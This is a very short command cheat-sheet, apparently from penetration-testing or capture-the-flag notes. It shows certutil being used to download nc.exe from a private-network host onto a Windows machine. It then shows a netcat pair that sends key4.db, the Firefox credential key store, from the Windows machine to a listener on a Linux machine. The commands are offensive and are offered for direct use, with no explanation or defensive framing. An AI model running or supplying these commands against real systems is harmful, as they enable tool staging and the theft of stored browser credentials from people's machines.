### Download file in Windows Machine.

`certutil -urlcache -f http://10.9.3.223:80/nc.exe nc.exe`

### Transfer file from Windows Machine to Linux (netcat)

`nc -nv 10.9.3.223 443 < key4.db (on windows machine)`

`nc -nvlp 443 > key4.db (on Linux Machine)`
